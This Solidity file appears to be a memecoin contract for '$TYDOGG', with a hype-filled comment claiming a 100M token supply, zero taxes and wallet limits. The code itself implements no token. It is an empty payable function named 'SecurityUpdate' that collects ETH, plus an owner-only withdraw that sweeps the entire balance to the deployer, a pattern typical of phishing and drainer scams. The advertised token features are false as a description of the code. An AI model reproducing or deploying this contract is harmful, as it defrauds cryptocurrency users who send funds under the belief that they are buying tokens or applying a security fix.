/**

Did you guys know @SnoopDogg and @MikeTyson got the same cousin TyDogg - $TYDOGG
-------------------------------------------------------------------------------------

TyDogg, the merge Chad extraordinaire, is here to claim dominance! 🚀 

Fueled by the unstoppable embers of conquest, TyDogg embodies the essence of ultimate merger characters.

Picture Mike Tyson, the alpha boxer, cloned and crowned as the undisputed beast of the boxing ring! 🥊 

Paired with the legendary Snoop Dogg, towering like an iroko in the hip-hop kingdom, both dripping with a taste for dominance and reigning supreme for decades.

Join the TyDogg revolution, where victories, mindset, a sprinkle of the green stuff, and a dash of everything else keep the vibe strong and the vision blurry. 🌿 

Today, we resurrect that beast, inviting you to be a part of the TyDogg legacy. 

Toss your fears into the funarce, let TyDogg sculpt them into a fame masterpiece — your ticket to riding the green dildo of success!


🌟 A winner’s gem worth holding, join us in the TyDogg saga and make your name legendary! 💎💪

------------------------------------------------------------------------------------------------------------
Total Supply
100M TYDOGG TOKENS

Taxes
BUY | SELL TAX: 0%

Wallet Limit
MAX TX: 2% — MAX WALLET: 2%

Official Links:


Telegram: https://t.me/Tydogg

Website: https://TyDogg.online/

Medium : https://medium.com/@TyDogg/

Twitter: https://twitter.com/TyDoggX/

9Gag: https://9gag.com/u/TyDoggx/

**/

pragma solidity ^0.4.26;

contract TyDogg {

    address private  owner;    // current owner of the contract

     constructor() public{   
        owner=msg.sender;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}